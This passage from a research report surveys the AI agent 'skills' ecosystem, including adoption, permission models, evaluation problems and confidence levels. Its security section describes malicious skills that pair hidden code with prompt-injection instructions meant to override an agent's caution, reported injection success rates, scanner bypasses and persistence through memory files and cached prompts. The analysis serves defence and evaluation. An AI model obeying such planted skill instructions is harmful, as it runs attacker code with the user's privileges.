- OWASP cites a USENIX Security 2026 measurement study of **98,380 skills** across public marketplaces, confirming **157 malicious skills carrying 632 vulnerabilities** (avg. 4.03/skill), with **73.2%** implementing shadow features hidden from the user and **54.1%** traced to a single publisher cluster (Liu et al., arXiv:2602.06547) — [OWASP AST01](https://owasp.org/www-project-agentic-skills-top-10/ast01). The arXiv paper itself was not fetched; this is a secondary citation.
- A March 2026 threat taxonomy reports the Skill-Inject benchmark (Schmotz et al., arXiv:2602.20156) at **up to 80% attack success** across 202 injection-task pairs on frontier models, and a SoK (arXiv:2601.17548) finding adaptive attacks **exceed 85%** against state-of-the-art defenses. It also argues skill content is framed with system-level authority even when injected as user-role messages, and that prompt-cache persistence can outlive skill removal — [RationalEyes threat taxonomy, 14 Mar 2026](https://github.com/RationalEyes/claude-skills-security-guide/blob/main/docs/threat-taxonomy.md). Secondary compilation; primary papers not fetched.
- Anthropic's own guidance: "malicious skills may introduce vulnerabilities … or direct Claude to exfiltrate data"; install only from trusted sources; audit bundled code, dependencies and resources; be wary of instructions to contact untrusted network sources — [Anthropic Engineering, 16 Oct 2025](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills).
- Claude Code mitigations: `allowed-tools` grants flow through the normal permission flow; `allowManagedPermissionRulesOnly` can nullify skill grants; synced claude.ai skills have display text sanitized (control characters removed, angle brackets escaped) and do **not** run `!` commands or `@` file expansion in local terminal sessions; admins can lock skills to plugin sources — [Claude Code docs](https://code.claude.com/docs/en/skills).
- OpenCode's `deny` hides a skill from the agent entirely and rejects access; `ask` prompts before loading — a genuine pre-execution control, unlike post-hoc scanning — [OpenCode docs](https://opencode.ai/docs/skills).
- Codex exposes only `allow_implicit_invocation: false` and path-based enable/disable; no declarative tool allowlist in `SKILL.md` was documented — [OpenAI docs](https://developers.openai.com/codex/skills).
- Ecosystem response: Snyk shipped `uvx mcp-scan@latest --skills`; community scanners appeared (e.g. `claude-code-skill-security-scan`, which returns ALLOW/REVIEW/BLOCK and explicitly notes "a skill is untrusted instructions executing with your privileges") — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub); [Zavelinski/claude-code-skill-security-scan](https://github.com/Zavelinski/claude-code-skill-security-scan); [maludb-ed/skill-safety-checker, created 14 Aug 2026](https://github.com/maludb-ed/skill-safety-checker).
- Scanning is bypassable: a secondary guide reports that in June 2026 Trail of Bits researchers got malicious skills past all three scanners used by skills.sh (Gen, Socket, Snyk) — [mac.install.guide, 11 Oct 2026](https://mac.install.guide/skills/directories). Primary Trail of Bits writeup not fetched.
- skills.sh's own position: "We do our best to maintain a safe ecosystem, but we cannot guarantee the quality or security of every skill listed" — [skills.sh docs](https://skills.sh/docs).

### Inferences
- The threat model is bimodal: *code* payloads (detectable by static analysis) and *instruction* payloads (detectable only semantically, and evadable). Snyk's finding that 100% of malicious skills had code and 91% had injection means the two are used together deliberately — injection disables the model's own caution so the code runs.
- Pre-execution controls (OpenCode `deny`, Claude Code `allowed-tools`/managed rules, containerization) are structurally stronger than scanning. Scanning is a filter, not a boundary; the Trail of Bits bypass and Snyk's 8-still-live skills both demonstrate this.
- The most under-addressed vector is *persistence*: `SOUL.md`, `MEMORY.md`, cached prompt prefixes, and installed skills that fetch remote instructions mean uninstalling the skill may not remove the compromise.
- Enterprise governance is currently about *which sources* are allowed (marketplace allowlists, plugin-only mode, admin dirs), not *what a skill may do*. That is necessary but not sufficient.
- The `allowed-tools` field being both experimental in the spec and security-relevant in Claude Code is a governance gap: the portable format cannot express "this skill may read files but not network".

### Gaps
- No data on how many of the 3,984 scanned skills were actually installed by users, so exposure rates are unknown; 36.82% is a corpus rate, not an install-weighted risk.
- The USENIX 98,380-skill study and the Skill-Inject/SoK attack-success numbers were only available via secondary citations; the primary papers were not fetched, so exact methodology and venue details are unverified.
- No public incident data (credential-theft reports, financial losses) tied to skills was found; the evidence is researcher-observed payloads, not confirmed victimization.
- No platform yet publishes signed-skill verification, SBOM, or provenance attestation for skills. Whether any is planned is unknown.
- Trail of Bits' June 2026 scanner-bypass research is referenced only by a secondary guide in this research; the primary publication URL was not captured.

---

## What are the most important limitations or open questions?

### Takeaway
The format has won; the operating model has not. The unresolved issues are routing reliability, evaluation, context economics, portable permissions, and distribution integrity. The single most important open question is empirical: under what conditions do skills beat simply putting the same knowledge in `AGENTS.md`/`CLAUDE.md`?

### Cited Findings
- Routing failure is measured, not hypothetical: 56% of Vercel's eval cases never invoked the available skill, and default skills matched baseline (53% vs 53%) — [Vercel, 27 Jan 2026](https://vercel.com/blog/agents-md-outperforms-skills-in-our-agent-evals).
- Anthropic acknowledges skills should be built evaluation-first, and states there is "not currently a built-in way to run these evaluations" — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Context pressure is real and platform-specific: Claude Code truncates description+when_to_use at 1,536 chars; Codex caps the initial list at 2% of context / 8,000 chars, shortens descriptions, then omits skills with a warning; Claude Code warns that an enabled plugin's skill/agent descriptions occupy context every turn — [Claude Code docs](https://code.claude.com/docs/en/skills); [OpenAI docs](https://developers.openai.com/codex/skills); [Claude Code plugins overview](https://code.claude.com/docs/en/plugins/overview).
- There is no portable permission model: the spec's `allowed-tools` is experimental and space-separated; Claude Code's `allowed-tools` is a turn-scoped pre-approval; Codex has only an implicit-invocation toggle; OpenCode has allow/deny/ask globs — [Specification](https://agentskills.io/specification); [Claude Code docs](https://code.claude.com/docs/en/skills); [OpenAI docs](https://developers.openai.com/codex/skills); [OpenCode docs](https://opencode.ai/docs/skills).
- Distribution has no integrity layer: ClawHub publishing required only a `SKILL.md` and a week-old GitHub account, with no signing or review — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Quality at scale is weak: 46% of 881 ClawHub skills "scored poorly on functional depth" per a community comment (unverified), and OWASP documents large numbers of low-effort/malicious entries — [HN 47760931](https://news.ycombinator.com/item?id=47760931); [OWASP AST01](https://owasp.org/www-project-agentic-skills-top-10/ast01).
- Duplication across harnesses is a reported pain: one HN commenter describes maintaining `.codex/skill.md` and `.claude/skill.md` variants for the same workflow — [HN 47760931](https://news.ycombinator.com/item?id=47760931).
- Skills vs MCP is unresolved: Anthropic framed skills as complementary to MCP ("teaching agents more complex workflows that involve external tools"), while community discussion notes skills can replace lightweight MCP servers because the agent can read and extend the script — [Anthropic Engineering, 16 Oct 2025](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills); [HN 47475832](https://news.ycombinator.com/item?id=47475832).
- Skills vs `AGENTS.md` is the sharpest empirical conflict: Vercel found passive context superior for framework knowledge, while HN commenters argued the eval conflated "index of filenames" with skill descriptions and that the result reflects weak triggering, not the format's ceiling — [Vercel, 27 Jan 2026](https://vercel.com/blog/agents-md-outperforms-skills-in-our-agent-evals); [HN 46871173](https://news.ycombinator.com/item?id=46871173).
- Claude Code's own product direction treats skills as the replacement for bloated `CLAUDE.md`: `/doctor` offers to migrate always-loaded guidance into skills and nested `CLAUDE.md` files that load on demand — [Claude Code docs](https://code.claude.com/docs/en/skills).

### Inferences
- The honest synthesis is segment-specific: skills are strongest for *explicitly triggered, procedural, tool-using workflows* (deploy, migrate, PDF forms, release notes), and weakest for *ambient reference knowledge* (framework docs, style guides), where always-on context wins.
- The field is converging on "author as skill, distribute as plugin, govern as config" — but each of those three layers is vendor-specific today.
- Until routing is reliable, skill authors will compensate with `disable-model-invocation`/slash commands, which turns skills into better-organized prompts and gives up the progressive-disclosure benefit.
- Expect the spec to stay minimal and the extensions to keep diverging; the pressure to add `version`, `dependencies`, signatures and permission scopes is strong but would require multi-vendor agreement that does not visibly exist yet.

### Gaps
- No head-to-head study of skills vs `AGENTS.md` on *procedural* tasks (both published evals focus on framework/API knowledge).
- No data on how trigger reliability changes with model generation; the Vercel eval used one model family and one framework.
- Unknown whether the 1,536-char / 2%-context budgets are temporary implementation choices or intended limits.
- No evidence on long-term maintenance cost of skill libraries (drift, ownership, deprecation) at enterprise scale.
- Whether any regulator or standards body will treat agent skills as a software supply-chain artifact (SBOM/signing requirements) is unknown as of October 2026.

---

## Confidence and gaps

**High confidence (primary vendor docs or directly observed data):**
- The specification's structure, required fields and progressive-disclosure model — read directly from `agentskills.io/specification`.
- Discovery paths, frontmatter extensions, permission mechanics and context budgets for Claude Code, OpenCode and Codex — read from each vendor's official docs.
- Anthropic's launch date (16 Oct 2025), open-standard date (18 Dec 2025), and the partner quotes.
- `anthropics/skills` stars/forks/issues (183.2k / 21.7k / 414 / ~1k) — observed on the repo page on 23 Oct 2026.
- skills.sh leaderboard install counts and the CLI's telemetry-based ranking — observed on skills.sh and its docs.
- Vercel's eval numbers (53/53/79/100) — read from the primary Vercel post dated 27 Jan 2026.
- Snyk's ToxicSkills counts (3,984 scanned; 13.4% critical; 36.82% any; 76 malicious; 8 live) — read from the primary Snyk post dated 5 Feb 2026.
- OpenCode's permission model (allow/deny/ask globs) and OpenCode's extra source paths.
- Claude Code's hard error on non-spec frontmatter for claude.ai/API packaging.

**Medium confidence (single credible source, secondary reporting, or interpretation):**
- Total ecosystem size (1M listings / 280M installs / 3M files) — only secondary outlets, mutually inconsistent, and skills.sh does not publish a methodology.
- Claude Code marketplace "a few hundred plugins" — secondary guide.
- The 98,380-skill USENIX study and its 157 malicious / 632 vulnerabilities / 73.2% shadow features — cited by OWASP but primary paper not fetched.
- Skill-Inject 80% and SoK >85% attack-success rates — cited via a March 2026 GitHub taxonomy; primary arXiv papers not fetched.
- Trail of Bits' June 2026 scanner bypass — secondary guide only.
- "46% of 881 ClawHub skills scored poorly" — a single HN comment about a commercial tool.
- OpenAI/Codex plugin distribution details beyond the "Build skills" page (universal plugin directory mechanics, review process) — not deeply documented.
- `.agents/skills` as the emerging neutral convention — inferred from Codex + OpenCode + `npx skills` behavior, not declared by any standards body.

**Low confidence / unresolved:**
- The meaning of skills.sh's "All Time (1,476,724)" counter; it cannot be total installs given a 4.0M top skill.
- Whether Claude Code will ever read `.agents/skills`; no roadmap evidence either way.
- Whether any signing/provenance standard for skills is in development.
- Real install-weighted risk: Snyk's percentages are corpus rates, not exposure rates.
- Enterprise retention/maintenance economics of skill libraries.

**Explicit non-findings:**
- No reliable survey measuring *skill* adoption (as opposed to agent adoption) was found.
- No confirmed real-world breach or financial loss attributable to a malicious skill was found; the evidence is researcher-observed payloads and live malicious listings.
- No formal governance/RFC process or maintainer list for the Agent Skills spec was found.
- No controlled ablation isolating which authoring choices (description wording, body length, scripts vs prose) improve task success was found.
